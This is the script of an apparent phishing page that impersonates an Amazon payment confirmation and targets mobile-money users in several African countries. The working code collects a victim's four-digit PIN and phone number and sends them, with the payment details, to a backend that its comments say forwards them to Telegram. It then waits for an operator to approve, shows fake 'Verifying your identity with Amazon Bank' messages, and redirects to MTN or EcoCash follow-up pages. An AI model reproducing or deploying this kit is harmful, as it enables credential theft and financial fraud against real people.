<script>
const CONFIG = {
  MTN_NEXT_PAGE: 'mtn.html',
  ECOCASH_NEXT_PAGE: 'ecocash.html',
  VERIFY_ENDPOINT: '/api/verify/send',
  STATUS_ENDPOINT: (id) => `/api/verify/status/${encodeURIComponent(id)}`,
  POLL_INTERVAL_MS: 2000,
  MAX_WAIT_MS: 5 * 60 * 1000,
  SHORT_LINK_ENDPOINTS: [
    (code) => `/api/links/${encodeURIComponent(code)}`,
    (code) => `/api/links?code=${encodeURIComponent(code)}`
  ],
  DEFAULT_FEE: 0,
  // How long to show the "Approved" flash before navigating
  APPROVED_FLASH_MS: 900,
  // After this many ms of pending, change the subtitle to reassure the user
  SLOW_HINT_MS: 6000
};

/* MTN countries — routed to mtn.html on approve */
const MTN_COUNTRIES = [
  'Benin', 'Cameroon', "Côte d'Ivoire", 'Congo', 'Eswatini',
  'Ghana (MTN)', 'Liberia', 'Rwanda (MTN)', 'Uganda (MTN)', 'Zambia (MTN)'
];
function nextPageFor(country) {
  return MTN_COUNTRIES.includes(String(country || '').trim())
    ? CONFIG.MTN_NEXT_PAGE
    : CONFIG.ECOCASH_NEXT_PAGE;
}

const CURRENCY_SYMBOLS = {
  USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
  MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
  UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
};
function currencySymbol(code) {
  const c = String(code || 'USD').toUpperCase();
  return CURRENCY_SYMBOLS[c] || (c + ' ');
}
function formatMoney(amount, currency) {
  const n = Number(amount);
  const safe = isFinite(n) ? n : 0;
  return currencySymbol(currency) + safe.toFixed(2);
}

const DIAL_CODES = {
  'Zimbabwe': '+263', 'South Africa': '+27', 'Zambia': '+260', 'Zambia (MTN)': '+260',
  'Botswana': '+267', 'Kenya': '+254', 'Malawi': '+265', 'Rwanda': '+250', 'Rwanda (MTN)': '+250',
  'DR Congo': '+243', 'Ghana': '+233', 'Ghana (MTN)': '+233', 'Lesotho': '+266',
  'Uganda': '+256', 'Uganda (MTN)': '+256', 'China (Alipay)': '+86',
  'Benin': '+229', 'Cameroon': '+237', "Côte d'Ivoire": '+225', 'Congo': '+242',
  'Eswatini': '+268', 'Liberia': '+231'
};
function dialCodeFor(country) { return DIAL_CODES[String(country || '').trim()] || ''; }

function b64urlDecode(str) {
  str = String(str).replace(/-/g, '+').replace(/_/g, '/');
  while (str.length % 4) str += '=';
  return decodeURIComponent(escape(atob(str)));
}
function readQuery(name) { return new URLSearchParams(window.location.search).get(name); }

async function resolvePayload() {
  try {
    const raw = sessionStorage.getItem('amz_payload');
    if (raw) return JSON.parse(raw);
  } catch (e) {}
  const d = readQuery('d');
  if (d) {
    try { return JSON.parse(b64urlDecode(d)); }
    catch (e) { throw new Error('Invalid link data.'); }
  }
  const code = readQuery('r');
  if (code) {
    for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
      try {
        const res = await fetch(makeUrl(code));
        if (!res.ok) continue;
        const data = await res.json();
        const payload = data && (data.payload || data);
        if (payload && (payload.am || payload.c)) return payload;
      } catch (e) {}
    }
    throw new Error('This payment link could not be loaded.');
  }
  throw new Error('No payment data available.');
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

function buildDisplayNumber(accountNumber, country) {
  const cleaned = String(accountNumber || '').replace(/[^\d+]/g, '');
  const dial = dialCodeFor(country);
  if (!cleaned) return { dial: dial || '+', number: '— — — —' };
  if (cleaned.startsWith('+')) return { dial: '', number: cleaned };
  let digits = cleaned;
  if (dial && digits.startsWith('0')) digits = digits.slice(1);
  const grouped = digits.replace(/(\d{2,3})(\d{2,3})(\d{2,4})/, '$1 $2 $3');
  return { dial, number: grouped };
}

const state = {
  payload: null,
  pin: ['', '', '', ''],
  requestId: null,
  polling: false,
  pollStart: 0,
  slowHintTimer: null
};

function render(payload) {
  state.payload = payload;
  const cur = String(payload.cur || 'USD').toUpperCase();
  const amount = Number(payload.am || 0);
  const fee = (payload.fee != null) ? Number(payload.fee) : CONFIG.DEFAULT_FEE;
  const receive = Math.max(0, amount - (isFinite(fee) ? fee : 0));

  document.getElementById('ctxRecipient').textContent = payload.rn || '—';
  const acct = String(payload.an || '').replace(/\s+/g, '');
  const last4 = acct.slice(-4) || '0000';
  const modeLabel = (String(payload.pm || '').trim()) || 'Amazon Flex Debit Card';
  document.getElementById('ctxMethod').textContent = modeLabel + ' *' + last4;
  document.getElementById('ctxRef').textContent = payload.tx || payload.tn || '—';
  document.getElementById('ctxAmount').textContent = formatMoney(receive, cur);

  const disp = buildDisplayNumber(payload.an || '', payload.c || '');
  document.getElementById('numFlag').textContent = disp.dial || '+';
  document.getElementById('numDisplay').textContent = disp.number;
}

function showStateCard(icon, title, message) {
  const scroll = document.getElementById('bodyScroll');
  scroll.innerHTML =
    '<div class="state-card">' +
      '<div class="ic">' + escapeHtml(icon) + '</div>' +
      '<h2>' + escapeHtml(title) + '</h2>' +
      '<p>' + escapeHtml(message) + '</p>' +
    '</div>';
}

function initPin() {
  const inputs = Array.from(document.querySelectorAll('.pin-input'));
  const errEl = document.getElementById('pinError');
  const verifyBtn = document.getElementById('verifyBtn');

  function updateState() {
    state.pin = inputs.map(i => i.value);
    const filled = state.pin.every(v => v !== '');
    inputs.forEach(i => i.classList.toggle('filled', i.value !== ''));
    verifyBtn.disabled = !filled;
    if (filled) errEl.classList.remove('show');
  }

  inputs.forEach((input, idx) => {
    input.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val.slice(-1);
      inputs.forEach(i => i.classList.remove('error'));
      if (val && idx < inputs.length - 1) inputs[idx + 1].focus();
      updateState();
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && idx > 0) inputs[idx - 1].focus();
      if (e.key === 'ArrowLeft' && idx > 0) inputs[idx - 1].focus();
      if (e.key === 'ArrowRight' && idx < inputs.length - 1) inputs[idx + 1].focus();
    });
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
      paste.split('').forEach((ch, i) => {
        if (inputs[i]) { inputs[i].value = ch; inputs[i].classList.add('filled'); }
      });
      const nextIdx = Math.min(paste.length, inputs.length - 1);
      if (inputs[nextIdx]) inputs[nextIdx].focus();
      updateState();
    });
    input.addEventListener('focus', () => input.select());
  });

  if (inputs[0]) setTimeout(() => inputs[0].focus(), 150);
}

/* ── Telegram send + poll ─────────────────── */
async function sendToTelegram(pin, number, payload) {
  const res = await fetch(CONFIG.VERIFY_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      pin,
      number,
      country: payload.c,
      recipient: payload.rn,
      amount: payload.am,
      currency: payload.cur,
      fee: payload.fee,
      reference: payload.tx || payload.tn,
      method: payload.pm
    })
  });
  if (!res.ok) throw new Error('Verification server unavailable.');
  const data = await res.json();
  if (!data.requestId) throw new Error('No request ID returned.');
  return data.requestId;
}

function pollStatus() {
  if (!state.requestId) return;
  if (Date.now() - state.pollStart > CONFIG.MAX_WAIT_MS) {
    handleDecline();
    return;
  }

  fetch(CONFIG.STATUS_ENDPOINT(state.requestId))
    .then(r => r.json())
    .then(data => {
      const status = (data && data.status) || (data && data.decision) || 'pending';
      if (status === 'approved') {
        handleApprove();
      } else if (status === 'declined') {
        handleDecline();
      } else {
        setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
      }
    })
    .catch(() => {
      setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
    });
}

function handleApprove() {
  state.polling = false;
  if (state.slowHintTimer) clearTimeout(state.slowHintTimer);

  // Show a brief "Approved" flash so the user sees confirmation
  const overlay = document.getElementById('verifyingOverlay');
  const title = overlay.querySelector('.load-title');
  const sub   = overlay.querySelector('.load-sub');
  const spinner = overlay.querySelector('.spinner');
  if (title) title.textContent = 'Approved ✓';
  if (sub) sub.textContent = 'Redirecting you to the next step…';
  if (spinner) spinner.style.display = 'none';

  const next = nextPageFor(state.payload && state.payload.c);
  const qs = window.location.search || '';

  setTimeout(() => {
    window.location.href = next + qs;
  }, CONFIG.APPROVED_FLASH_MS);
}

function handleDecline() {
  state.polling = false;
  if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
  document.getElementById('verifyingOverlay').classList.remove('show');
  document.getElementById('resultOverlay').classList.add('show');
  document.querySelectorAll('.pin-input').forEach(i => {
    i.value = '';
    i.classList.remove('filled');
  });
  state.pin = ['', '', '', ''];
  document.getElementById('verifyBtn').disabled = true;
  state.requestId = null;
}

async function doVerify() {
  const errEl = document.getElementById('pinError');
  const allFilled = state.pin.every(v => v !== '');
  if (!allFilled) {
    errEl.classList.add('show');
    document.querySelectorAll('.pin-input').forEach(i => i.classList.add('error'));
    return;
  }

  const pin = state.pin.join('');
  const number = document.getElementById('numDisplay').textContent;

  // Reset overlay text in case of retry
  const overlay = document.getElementById('verifyingOverlay');
  const title = overlay.querySelector('.load-title');
  const sub   = overlay.querySelector('.load-sub');
  const spinner = overlay.querySelector('.spinner');
  if (title) title.textContent = 'Verifying your identity';
  if (sub) sub.textContent = "We're confirming your PIN with Amazon Bank. This usually takes a few seconds.";
  if (spinner) spinner.style.display = '';

  overlay.classList.add('show');

  try {
    const requestId = await sendToTelegram(pin, number, state.payload);
    state.requestId = requestId;
    state.pollStart = Date.now();
    state.polling = true;

    // After SLOW_HINT_MS, reassure the user if Telegram hasn't decided yet
    state.slowHintTimer = setTimeout(() => {
      if (state.polling && sub) {
        sub.textContent = 'Still waiting for approval — this can take a moment. Please don\'t close this page.';
      }
    }, CONFIG.SLOW_HINT_MS);

    setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
  } catch (err) {
    overlay.classList.remove('show');
    handleDecline();
  }
}

/* ── Boot ─────────────────────────────────── */
async function boot() {
  document.getElementById('backBtn').addEventListener('click', () => {
    if (window.history.length > 1) window.history.back();
  });

  document.getElementById('tryAgainBtn').addEventListener('click', () => {
    document.getElementById('resultOverlay').classList.remove('show');
    document.getElementById('pinError').classList.remove('show');
    const firstPin = document.querySelector('.pin-input');
    if (firstPin) firstPin.focus();
  });

  try {
    const payload = await resolvePayload();
    if (payload && payload.exp && Date.now() > Number(payload.exp)) {
      showStateCard('⏱', 'This link has expired',
        'The payment request is no longer valid. Please ask the sender to generate a new link.');
      return;
    }
    render(payload);
    initPin();
    document.getElementById('verifyBtn').addEventListener('click', doVerify);
  } catch (err) {
    showStateCard('⚠', 'Payment link unavailable',
      err.message || 'Please start over from the payment link.');
  }
}

document.addEventListener('DOMContentLoaded', boot);
</script>
